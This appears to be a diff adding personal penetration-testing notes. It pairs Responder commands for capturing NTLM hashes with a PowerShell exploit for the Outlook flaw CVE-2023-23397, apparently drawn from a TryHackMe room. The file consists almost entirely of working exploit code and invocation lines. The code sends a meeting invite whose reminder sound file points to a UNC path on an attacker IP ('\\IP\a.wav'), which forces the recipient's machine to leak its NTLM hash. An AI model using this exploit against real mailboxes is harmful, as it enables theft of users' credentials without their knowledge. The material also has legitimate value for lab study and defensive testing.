@@ -1,0 +1,46 @@
+### smb responder ###
+
+
+############
+## listen ##
+############
+responder -I ens5								# I:interface
+responder -I tun0
+
+
+#####################
+## outlookntlmleak ##
+#####################
+# https://tryhackme.com/room/outlookntlmleak
+# https://github.com/api0cradle/CVE-2023-23397-POC-Powershell
+
+function Send-CalendarNTLMLeak ($recipient, $remotefilepath, $meetingsubject, $meetingbody)
+{
+# First, we will instantiate an "Outlook.Application" object and create an appointment.
+$Outlook = New-Object -comObject Outlook.Application
+$newcal = $outlook.CreateItem('olAppointmentItem')
+
+# usual parameters
+$newcal.Recipients.add($recipient)
+$newcal.MeetingStatus = [Microsoft.Office.Interop.Outlook.OlMeetingStatus]::olMeeting
+$newcal.Subject = $meetingsubject
+$newcal.Location = "Virtual"
+$newcal.Body = $meetingbody
+$newcal.Start = get-date
+$newcal.End = (get-date).AddHours(2)
+
+# reminder's sound
+$newcal.ReminderSoundFile = $remotefilepath
+$newcal.ReminderOverrideDefault = 1
+$newcal.ReminderSet = 1
+$newcal.ReminderPlaysound = 1
+
+# send
+$newcal.send()
+}
+
+# exploit
+PS> Import-Module .\CVE-2023-23397.ps1
+PS> Send-CalendarNTLMLeak -recipient "ab@ab.fr" -remotefilepath "\\IP\a.wav" -meetingsubject "sub" -meetingbody "bod"
+
+
